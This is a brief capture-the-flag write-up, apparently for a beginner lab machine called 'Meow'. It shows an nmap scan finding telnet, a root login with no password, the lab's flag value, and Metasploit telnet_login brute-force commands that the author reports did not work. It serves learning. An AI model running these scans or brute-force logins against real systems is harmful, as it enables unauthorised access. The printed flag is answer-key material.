
Nmap scanning :

~~~
nmap 10.129.204.160 -sC -sV
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 09:03 EDT
Nmap scan report for 10.129.204.160
Host is up (0.42s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.13 seconds
~~~


after the nmap scan we find that telnet service has been running  in the machine

telnet:

Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication channel between two machines.
telnet is run in 23 port of the server
this protocol used in application layer client server protocol that provides terminal session to remote host

the user name root 

~~~
root@Meow:~# whoami
root
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 
~~~


in this lab we learn about telnet and brute force in telnet protocol using metasploit

~~~
msf auxiliary(telnet_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf auxiliary(telnet_login) > set RHOSTS 
RHOSTS => 10.129.204.160
msf auxiliary(telnet_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf auxiliary(telnet_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(telnet_login) > run
~~~
this exploit does not work


successfully finished this lab 🔥🔥





